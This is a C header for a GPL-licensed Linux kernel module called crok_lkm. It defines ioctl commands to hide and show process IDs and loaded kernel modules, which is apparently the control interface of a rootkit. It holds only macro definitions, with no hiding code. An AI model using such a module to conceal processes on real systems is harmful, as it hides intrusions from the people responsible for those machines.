/*
 * crok_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _CROK_LKM_CTRL_IOCTL_H_
#define _CROK_LKM_CTRL_IOCTL_H_

/******************************************************************************
 * Ioctl definitions
 ******************************************************************************/

/* Use 'k' as magic number */
#define CROK_IOC_MAGIC          'k'

#define CROK_IOC_MAX_NR         16

#define CROK_IOC_HIDE_CMD       0b00001
#define CROK_IOC_SHOW_CMD       0b00010
#define CROK_IOC_PID            0b00100
#define CROK_IOC_HIDE_PID_CMD   CROK_IOC_PID | CROK_IOC_HIDE_CMD
#define CROK_IOC_SHOW_PID_CMD   CROK_IOC_PID | CROK_IOC_SHOW_CMD
#define CROK_IOC_MOD            0b01000
#define CROK_IOC_HIDE_MOD_CMD   CROK_IOC_MOD | CROK_IOC_HIDE_CMD
#define CROK_IOC_SHOW_MOD_CMD   CROK_IOC_MOD | CROK_IOC_SHOW_CMD
#define CROK_IOC_LOG            0b10000

#define CROK_IOC_RESET          _IO(CROK_IOC_MAGIC, 0)
#define CROK_IOC_HIDE_PID       _IOW(CROK_IOC_MAGIC,  CROK_IOC_HIDE_PID_CMD, int)
#define CROK_IOC_SHOW_PID       _IOW(CROK_IOC_MAGIC,  CROK_IOC_SHOW_PID_CMD, int)
#define CROK_IOC_HIDE_MOD       _IOW(CROK_IOC_MAGIC,  CROK_IOC_HIDE_MOD_CMD, int)
#define CROK_IOC_SHOW_MOD       _IOW(CROK_IOC_MAGIC,  CROK_IOC_SHOW_MOD_CMD, int)

#endif /* _CROK_LKM_CTRL_IOCTL_H_ */

